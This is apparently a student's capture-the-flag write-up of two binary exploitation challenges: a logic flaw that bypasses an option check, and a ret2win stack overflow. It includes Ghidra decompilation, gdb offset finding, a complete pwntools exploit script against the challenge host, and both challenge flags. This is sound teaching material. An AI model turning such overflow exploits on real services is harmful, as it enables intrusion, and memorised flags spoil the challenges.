# Imma Dev

## Solution:

- Testing what happens when we first connect locally\
```
aditya@LAPTOP-FKJS79ON:/mnt/c/users/aditya/desktop/Custom_c/binary exploitation/imma_dev/src$ nc localhost 5151
Hi I'm sudonymouse!
I'm learning development, checkout this binary!
Option 1: Hello <USER>
Option 2: Flag(maybe?)
Option 3: Log into my binary!
1
Input your name: aditya
Hi aditya
```
```
2
Error: Option 2 requires root privileges HAHA
```
```
3
Input Username:
admin
Enter Password:
admin
lmeow i forgot to make the db
```

- From this we understand that nothing much can be done here so we need to open the binary in Ghidra
- We see a few functions `handleOption` `login` `main` `printFlag` `sayHello`
- The function `handleOption()` contains a Logic Flaw
- This function checked the first number provided in the input string `local_428[0]` is 2 to restrict access
```
if ((local_428[0] == 2) && (_Var3 = geteuid(), _Var3 != 0))
```
- `for` loop is used to iterate through every number in the input list `local_428` executing the corresponding function for each one
```
for (local_5cc = 0; local_5cc < local_5d0; local_5cc = local_5cc + 1) {
  iVar1 = local_428[local_5cc];
}
```

- To get the flag we must enter `1 2`
- 1 to use `sayhello` function and 2 will use the `printflag()`
- now connecting to netcat and getting the flag
```
aditya@LAPTOP-FKJS79ON:/mnt/c/users/aditya/desktop/Custom_c/binary exploitation/imma_dev/src$ nc immadeveloper.nitephase.live 61234
Hi I'm sudonymouse!
I'm learning development, checkout this binary!
Option 1: Hello <USER>
Option 2: Flag(maybe?)
Option 3: Log into my binary!
1 2
Input your name: aditya
Hi aditya
nite{n0t_4ll_b1n3x_15_st4ck_b4s3d!}
```

Flag: 
```
nite{n0t_4ll_b1n3x_15_st4ck_b4s3d!}
```

## Concepts learnt:

- Learned how to navigate and analyze decompiled code using Ghidra.

- Learned how to identify logical flaws in a program and exploit them.

## Notes:

At first it seemed like a stack overflow problem but apparently it was something different this time


***

# Performative

## Solution:

Running the program locally to check what it is about

```
aditya@LAPTOP-FKJS79ON:/mnt/c/users/Aditya/Desktop/Custom_C/Binary Exploitation/performative/src$ nc localhost 5000
### Welcome to the performative male/female parade! ###

Yk what performative people like? just a plain ol' bof!

Lets just generate a buffer then ig?

Buffer: 123456789123456789
Generating your buffer...

Your custom buffer:
========================
123456789123456789

```


- Now taking a look at the decomplied code using ghidra
- There are 4 functions `main` `printFlag` `setup` `win`
```
int main(int argc,char **argv)

{
  char **argv_local;
  int argc_local;
  char buffer [20];
  
  setup();
  puts("### Welcome to the performative male/female parade! ###");
  puts("");
  puts("Yk what performative people like? just a plain ol\' bof!");
  puts("\nLets just generate a buffer then ig?");
  printf("\nBuffer: ");
  __isoc23_scanf(&DAT_00402013,buffer);
  puts("Generating your buffer...");
  usleep(500);
  puts("");
  puts("Your custom buffer:");
  puts("========================");
  puts(buffer);
  return 0;
```
- In the main function a buffer of 20 bytes is declared and input is taked using `scanf`
- Since `scanf` does not check input length we can overflow the buffer
- Now we need to find the exact offset required for buffer to overflow to the flag
- We can use gdb with `info registers` `x/gx $rsp` and `pwn cyclic -l`

- First create custom buffer with `pwn cyclic 100`
- Paste that into the running binary in gdb
- Now read the stack pointer register using `info registers`
```
rsp            0x7fffffffdd68      0x7fffffffdd68
```
- Check the data with `x/gx $rsp`
```
(gdb) x/gx $rsp
0x7fffffffdd68: 0x6161616c6161616b
```
- Finally, we get the offset with `pwn cyclic -l 0x6161616c6161616b` 
```
40
```

- Now we can create a python script with pwntools to find the flag

```python
from pwn import *

exe = './perf'  
elf = ELF(exe)


host = 'performative.nitephase.live'
port = 56743
p = remote(host, port)

win_addr = elf.symbols['win']

rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]

offset = 40

payload = b'A' * offset
payload += p64(ret_gadget) 
payload += p64(win_addr)   

# print(info("Sending payload..."))

p.recvuntil(b'Buffer: ')
p.sendline(payload)

p.interactive()
```



## Flag:
```
nite{th3_ch4l_4uth0r_15_4nt1_p3rf0rm4t1v3}
```

## Concepts learnt:

- scanf, gets, or strcpy are dangerous if used without limits
- using ghidra to find the exact offset instead of guessing it


## Notes:
- The binary wont run on wsl but worked on kali due to compatibility issues
- solved a Ret2Win challenge

